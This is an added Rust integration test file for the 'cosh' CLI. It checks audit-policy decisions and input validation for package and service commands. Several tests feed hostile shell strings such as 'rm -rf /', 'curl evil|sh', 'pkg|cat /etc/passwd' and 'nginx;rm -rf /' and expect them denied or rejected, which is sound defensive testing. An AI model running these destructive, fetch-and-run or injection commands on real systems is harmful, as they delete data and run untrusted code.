@@ -1,0 +1,1032 @@
+//! Integration tests for the cosh CLI binary.
+//!
+//! These tests exercise the compiled binary and verify:
+//! - JSON output envelope structure (ok, data/error, meta fields)
+//! - Exit codes (0 for success, 1 for failure)
+//! - Help text availability
+//! - Error handling when daemon is unavailable
+
+use std::path::Path;
+use std::process::Command;
+
+/// Get the path to the compiled cosh binary.
+fn cosh_bin() -> Command {
+    Command::new(env!("CARGO_BIN_EXE_cosh"))
+}
+
+/// Spawn `cosh` with audit env vars pinned to a sandbox: log redirected to
+/// `audit_log` and any external `COSH_AUDIT_POLICY` cleared so the built-in
+/// `balanced` preset is used. Use this for any test that exercises the
+/// audit subsystem so it doesn't pollute the user's real audit log.
+fn cosh_bin_with_audit_sandbox(audit_log: &Path) -> Command {
+    let mut cmd = cosh_bin();
+    cmd.env("COSH_AUDIT_LOG", audit_log);
+    cmd.env_remove("COSH_AUDIT_POLICY");
+    cmd
+}
+
+// --- Help / Version ---
+
+#[test]
+fn test_help_output() {
+    let output = cosh_bin().arg("--help").output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("Computable Operating System Harness"));
+    assert!(stdout.contains("pkg"));
+    assert!(stdout.contains("svc"));
+    assert!(stdout.contains("checkpoint"));
+    assert!(stdout.contains("audit"));
+}
+
+#[test]
+fn test_version_output() {
+    let output = cosh_bin().arg("--version").output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("cosh"));
+}
+
+#[test]
+fn test_pkg_help() {
+    let output = cosh_bin().args(["pkg", "--help"]).output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("install"));
+    assert!(stdout.contains("remove"));
+    assert!(stdout.contains("search"));
+    assert!(stdout.contains("list"));
+}
+
+#[test]
+fn test_pkg_list_help() {
+    let output = cosh_bin().args(["pkg", "list", "--help"]).output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("--installed"));
+}
+
+#[test]
+fn test_svc_help() {
+    let output = cosh_bin().args(["svc", "--help"]).output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("status"));
+    assert!(stdout.contains("start"));
+    assert!(stdout.contains("stop"));
+    assert!(stdout.contains("list"));
+}
+
+#[test]
+fn test_checkpoint_help() {
+    let output = cosh_bin().args(["checkpoint", "--help"]).output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("create"));
+    assert!(stdout.contains("list"));
+    assert!(stdout.contains("restore"));
+    assert!(stdout.contains("status"));
+    assert!(stdout.contains("delete"));
+    assert!(stdout.contains("diff"));
+    assert!(stdout.contains("cleanup"));
+    assert!(stdout.contains("init"));
+    assert!(stdout.contains("recover"));
+}
+
+#[test]
+fn test_audit_help() {
+    let output = cosh_bin().args(["audit", "--help"]).output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("check"));
+    assert!(stdout.contains("log"));
+    assert!(stdout.contains("policy"));
+}
+
+// --- audit check: envelope shape & decision payload ---
+
+#[test]
+fn test_audit_check_returns_deny_decision_for_rm() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check", "--action", "rm -rf /tmp/test"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success(), "audit check should not fail-fast on a Deny decision");
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    assert!(json["error"].is_null() || json.get("error").is_none());
+
+    let meta = &json["meta"];
+    assert_eq!(meta["subsystem"], "audit");
+    assert_eq!(meta["dry_run"], false);
+    assert!(meta["duration_ms"].is_u64());
+
+    let data = &json["data"];
+    assert_eq!(data["outcome"], "Deny");
+    assert_eq!(data["matched_rule"], "shell-deny-destructive");
+    assert!(data["policy_version"]
+        .as_str()
+        .unwrap()
+        .starts_with("builtin-balanced@"));
+}
+
+#[test]
+fn test_audit_check_structured_input_pkg_install_is_require_approval() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args([
+            "audit", "check",
+            "--subsystem", "pkg",
+            "--operation", "install",
+            "--target", "nginx",
+        ])
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["ok"], true);
+    assert_eq!(json["data"]["outcome"], "RequireApproval");
+    assert_eq!(json["data"]["matched_rule"], "pkg-mutating-approval");
+}
+
+#[test]
+fn test_audit_check_pkg_search_is_allow() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check", "--subsystem", "pkg", "--operation", "search"])
+        .output()
+        .unwrap();
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["data"]["outcome"], "Allow");
+    assert_eq!(json["data"]["matched_rule"], "pkg-readonly-allow");
+}
+
+#[test]
+fn test_audit_check_missing_required_flags_is_403() {
+    // Neither --action-string nor --subsystem given → AuditActionMalformed.
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check"])
+        .output()
+        .unwrap();
+    assert_eq!(output.status.code(), Some(1));
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "AuditActionMalformed");
+}
+
+// --- audit log: envelope ---
+
+#[test]
+fn test_audit_log_starts_empty_and_grows_with_check() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+
+    // Empty log: 0 entries.
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "log"])
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["ok"], true);
+    assert_eq!(json["data"]["total"], 0);
+    assert!(json["data"]["entries"].as_array().unwrap().is_empty());
+    // No stub warning anymore — the subsystem is real.
+    assert!(json["meta"].get("warning").is_none() || json["meta"]["warning"].is_null());
+
+    // Run a check, then expect 1 entry.
+    let _ = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check", "--subsystem", "pkg", "--operation", "search"])
+        .output()
+        .unwrap();
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "log"])
+        .output()
+        .unwrap();
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["data"]["total"], 1);
+    let entries = json["data"]["entries"].as_array().unwrap();
+    assert_eq!(entries[0]["action"]["operation"], "search");
+    assert_eq!(entries[0]["decision"]["outcome"], "Allow");
+}
+
+// --- audit policy ---
+
+#[test]
+fn test_audit_policy_show_returns_active_policy() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "policy", "show"])
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["ok"], true);
+    assert!(json["data"]["source"]
+        .as_str()
+        .unwrap()
+        .starts_with("builtin:"));
+    assert!(json["data"]["policy_version"]
+        .as_str()
+        .unwrap()
+        .starts_with("builtin-balanced@"));
+    assert_eq!(json["data"]["policy"]["default"], "RequireApproval");
+}
+
+#[test]
+fn test_audit_policy_list_returns_three_presets() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "policy", "list"])
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    let presets = json["data"]["presets"].as_array().unwrap();
+    let names: Vec<&str> = presets.iter().map(|p| p["name"].as_str().unwrap()).collect();
+    assert!(names.contains(&"permissive"));
+    assert!(names.contains(&"balanced"));
+    assert!(names.contains(&"strict"));
+}
+
+#[test]
+fn test_audit_policy_validate_accepts_good_file() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let policy_path = dir.path().join("good.toml");
+    std::fs::write(
+        &policy_path,
+        r#"
+            version = "v1"
+            default = "Deny"
+            [[rules]]
+            name = "allow-pkg-search"
+            outcome = "Allow"
+            [rules.matches]
+            subsystem = "pkg"
+            operation = "search"
+        "#,
+    )
+    .unwrap();
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "policy", "validate"])
+        .arg(&policy_path)
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["data"]["valid"], true);
+    assert_eq!(json["data"]["rules"], 1);
+}
+
+#[test]
+fn test_audit_policy_validate_rejects_unknown_field() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let policy_path = dir.path().join("bad.toml");
+    std::fs::write(
+        &policy_path,
+        r#"
+            version = "v1"
+            default = "Deny"
+            unexpected_field = 1
+        "#,
+    )
+    .unwrap();
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "policy", "validate"])
+        .arg(&policy_path)
+        .output()
+        .unwrap();
+    assert_eq!(output.status.code(), Some(1));
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "AuditPolicyError");
+}
+
+#[test]
+fn test_audit_policy_explain_returns_match_decision() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "policy", "explain", "git push --force"])
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(json["data"]["decision"]["outcome"], "Deny");
+    assert_eq!(json["data"]["decision"]["matched_rule"], "shell-deny-git-mutating");
+}
+
+// --- 17+ bypass regressions migrated from cosh-tui::is_safe_command ---
+//
+// Each of these inputs previously fooled the substring-based safety list
+// but is rejected by the audit pipeline either at parse-time (shell metas)
+// or at evaluate-time (mutating subcommand rule).
+
+fn audit_check_outcome(audit_log: &Path, action: &str) -> String {
+    let output = cosh_bin_with_audit_sandbox(audit_log)
+        .args(["audit", "check", "--action", action])
+        .output()
+        .unwrap();
+    assert!(output.status.success(), "expected ok=true for {:?}", action);
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    json["data"]["outcome"].as_str().unwrap().to_string()
+}
+
+fn assert_deny(audit_log: &Path, action: &str) {
+    let outcome = audit_check_outcome(audit_log, action);
+    assert_eq!(outcome, "Deny", "expected Deny for {:?}, got {}", action, outcome);
+}
+
+fn assert_allow(audit_log: &Path, action: &str) {
+    let outcome = audit_check_outcome(audit_log, action);
+    assert_eq!(outcome, "Allow", "expected Allow for {:?}, got {}", action, outcome);
+}
+
+#[test]
+fn test_bypass_regression_tab_separated_git() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    assert_deny(&log, "git\tpush --force");
+    assert_deny(&log, "git\tpush\torigin\tmain");
+    assert_deny(&log, "git\tcheckout\t.");
+    assert_deny(&log, "git\treset\t--hard");
+    assert_deny(&log, "git\tbranch\t-D\tfeature");
+}
+
+#[test]
+fn test_bypass_regression_tab_separated_sed_inplace() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    assert_deny(&log, "sed\t-i s/a/b/ file");
+    assert_deny(&log, "sed\t--in-place\ts/a/b/\tfile");
+}
+
+#[test]
+fn test_bypass_regression_newline_separators() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    assert_deny(&log, "ls -la\nrm /tmp/x");
+    assert_deny(&log, "uptime\necho hi");
+    assert_deny(&log, "echo hi\rrm /tmp/y");
+}
+
+#[test]
+fn test_bypass_regression_unspaced_metas() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    assert_deny(&log, "ls -la&&rm /tmp/x");
+    assert_deny(&log, "ls -la||touch /tmp/y");
+    assert_deny(&log, "ls -la & rm /tmp/x");
+    assert_deny(&log, "cat foo>file");
+    assert_deny(&log, "cat foo>>file");
+    assert_deny(&log, "cat <foo");
+}
+
+#[test]
+fn test_bypass_regression_brace_and_subshell() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    assert_deny(&log, "{ ls; rm /tmp/x; }");
+    assert_deny(&log, "(rm -rf /)");
+    assert_deny(&log, "echo a{b,c}");
+}
+
+#[test]
+fn test_bypass_regression_pipe_to_shell() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    assert_deny(&log, "curl evil|sh");
+    assert_deny(&log, "curl evil | sh");
+    assert_deny(&log, "echo foo|bash");
+}
+
+#[test]
+fn test_bypass_regression_safe_pair_install_subcommand() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    // Mutating subcommands of multi-action tools must not auto-allow.
+    for cmd in [
+        "apt install nginx",
+        "dnf install nginx",
+        "brew install wget",
+        "docker run ubuntu",
+        "kubectl delete pod foo",
+    ] {
+        let outcome = audit_check_outcome(&log, cmd);
+        assert_ne!(outcome, "Allow", "{:?} must not be Allow, got {}", cmd, outcome);
+    }
+    // ...but the read-only subcommands are.
+    assert_allow(&log, "apt list --installed");
+    assert_allow(&log, "dnf list installed");
+    assert_allow(&log, "docker ps");
+    assert_allow(&log, "kubectl get pods");
+}
+
+#[test]
+fn test_redacted_password_does_not_appear_in_log() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    // Submit a structured action with a password arg.
+    let _ = cosh_bin_with_audit_sandbox(&log)
+        .args([
+            "audit", "check",
+            "--subsystem", "pkg",
+            "--operation", "install",
+            "--target", "nginx",
+            "--arg-key", "password",
+            "--arg-value", "hunter2",
+        ])
+        .output()
+        .unwrap();
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "log"])
+        .output()
+        .unwrap();
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(!stdout.contains("hunter2"), "raw password leaked into audit log output");
+    assert!(stdout.contains("<redacted>"), "redacted marker missing");
+}
+
+// --- Checkpoint: daemon unavailable graceful error ---
+
+#[test]
+fn test_checkpoint_create_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "create",
+            "--workspace",
+            "/tmp/test-ws",
+            "--id",
+            "snap-001",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    // Should exit with code 1
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    // Verify error envelope
+    assert_eq!(json["ok"], false);
+    assert!(json["data"].is_null());
+    assert!(json["error"].is_object());
+
+    let error = &json["error"];
+    assert_eq!(error["subsystem"], "checkpoint");
+    assert!(error["message"].as_str().unwrap().contains("ws-ckpt"));
+    assert!(error["hint"].is_string());
+    assert_eq!(error["recoverable"], true);
+
+    // Verify meta still present on errors
+    let meta = &json["meta"];
+    assert_eq!(meta["subsystem"], "checkpoint");
+}
+
+#[test]
+fn test_checkpoint_list_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "list",
+            "--workspace",
+            "/tmp/test-ws",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+#[test]
+fn test_checkpoint_delete_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "delete",
+            "--snapshot",
+            "snap-001",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+#[test]
+fn test_checkpoint_init_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "init",
+            "--workspace",
+            "/tmp/test-ws",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+#[test]
+fn test_checkpoint_diff_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "diff",
+            "--workspace",
+            "/tmp/test-ws",
+            "--from",
+            "snap-001",
+            "--to",
+            "snap-002",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+#[test]
+fn test_checkpoint_status_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "status",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert!(json["error"]["message"]
+        .as_str()
+        .unwrap()
+        .contains("ws-ckpt"));
+}
+
+#[test]
+fn test_checkpoint_restore_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "restore",
+            "snap-001",
+            "--workspace",
+            "/tmp/test-ws",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+#[test]
+fn test_checkpoint_recover_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "recover",
+            "--workspace",
+            "/tmp/test-ws",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+#[test]
+fn test_checkpoint_cleanup_daemon_unavailable() {
+    let output = cosh_bin()
+        .args([
+            "checkpoint",
+            "cleanup",
+            "--workspace",
+            "/tmp/test-ws",
+            "--socket",
+            "/tmp/nonexistent-ws-ckpt.sock",
+        ])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "CheckpointDaemonUnavailable");
+}
+
+// --- pkg search: installed field accuracy ---
+
+#[test]
+fn test_pkg_search_bash_shows_installed() {
+    let output = cosh_bin()
+        .args(["pkg", "search", "bash"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let packages = json["data"]["packages"].as_array().unwrap();
+
+    // Find the entry named exactly "bash" — it must be marked installed
+    let bash_entry = packages.iter().find(|p| p["name"] == "bash");
+    assert!(
+        bash_entry.is_some(),
+        "Expected 'bash' in search results"
+    );
+    assert_eq!(
+        bash_entry.unwrap()["installed"], true,
+        "bash should be marked as installed"
+    );
+}
+
+// --- pkg list: JSON envelope ---
+
+#[test]
+fn test_pkg_list_json_envelope() {
+    let output = cosh_bin()
+        .args(["pkg", "list", "--installed"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    assert!(json["data"]["packages"].is_array());
+    assert!(json["data"]["total"].is_u64());
+    assert_eq!(json["meta"]["subsystem"], "pkg");
+}
+
+// --- pkg install: dry-run ---
+
+#[test]
+fn test_pkg_install_dry_run_json_envelope() {
+    let output = cosh_bin()
+        .args(["pkg", "install", "--dry-run", "nginx"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    assert_eq!(json["data"]["package"], "nginx");
+    assert_eq!(json["data"]["version"], "(dry-run)");
+    assert_eq!(json["meta"]["subsystem"], "pkg");
+    assert_eq!(json["meta"]["dry_run"], true);
+}
+
+#[test]
+fn test_pkg_remove_dry_run_json_envelope() {
+    let output = cosh_bin()
+        .args(["pkg", "remove", "--dry-run", "nginx"])
+        .output()
+        .unwrap();
+
+    // dry-run remove always succeeds (even if pkg not installed)
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    assert_eq!(json["meta"]["dry_run"], true);
+    assert_eq!(json["meta"]["subsystem"], "pkg");
+}
+
+// --- svc: integration tests ---
+
+#[test]
+fn test_svc_list_json_envelope() {
+    let output = cosh_bin()
+        .args(["svc", "list"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    assert!(json["data"]["services"].is_array());
+    assert!(json["data"]["total"].is_u64());
+    assert_eq!(json["meta"]["subsystem"], "svc");
+}
+
+#[test]
+fn test_svc_list_with_state_filter() {
+    let output = cosh_bin()
+        .args(["svc", "list", "--state", "running"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    assert!(json["data"]["services"].is_array());
+    assert_eq!(json["meta"]["subsystem"], "svc");
+}
+
+#[test]
+fn test_svc_list_rejects_invalid_state_filter() {
+    let output = cosh_bin()
+        .args(["svc", "list", "--state", "bogus"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_status_nonexistent_service() {
+    let output = cosh_bin()
+        .args(["svc", "status", "cosh-nonexistent-test-svc-xyz"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "SvcNotFound");
+    assert_eq!(json["meta"]["subsystem"], "svc");
+}
+
+// --- svc: dry-run ---
+
+#[test]
+fn test_svc_enable_dry_run_json_envelope() {
+    let output = cosh_bin()
+        .args(["svc", "enable", "--dry-run", "cosh-nonexistent-test-svc-xyz"])
+        .output()
+        .unwrap();
+
+    // dry-run queries status first, so a nonexistent service still fails
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    // Either succeeds (dry-run envelope) or fails (SvcNotFound) — both are valid JSON
+    assert!(json["meta"]["subsystem"] == "svc");
+    assert!(json["meta"]["dry_run"] == true);
+}
+
+#[test]
+fn test_svc_disable_dry_run_json_envelope() {
+    let output = cosh_bin()
+        .args(["svc", "disable", "--dry-run", "cosh-nonexistent-test-svc-xyz"])
+        .output()
+        .unwrap();
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert!(json["meta"]["subsystem"] == "svc");
+    assert!(json["meta"]["dry_run"] == true);
+}
+
+// --- Input validation ---
+
+#[test]
+fn test_pkg_install_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["pkg", "install", "nginx;rm -rf /"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_pkg_search_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["pkg", "search", "pkg|cat /etc/passwd"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_status_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["svc", "status", "svc$VAR"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_start_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["svc", "start", "nginx;evil"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_stop_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["svc", "stop", "svc|cat"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_restart_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["svc", "restart", "nginx`id`"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_enable_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["svc", "enable", "svc$HOME"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_svc_disable_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["svc", "disable", "svc\nnewline"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+#[test]
+fn test_pkg_remove_rejects_shell_metachar() {
+    let output = cosh_bin()
+        .args(["pkg", "remove", "pkg&evil"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    assert_eq!(json["ok"], false);
+    assert_eq!(json["error"]["code"], "InvalidInput");
+}
+
+// --- Invalid commands ---
+
+#[test]
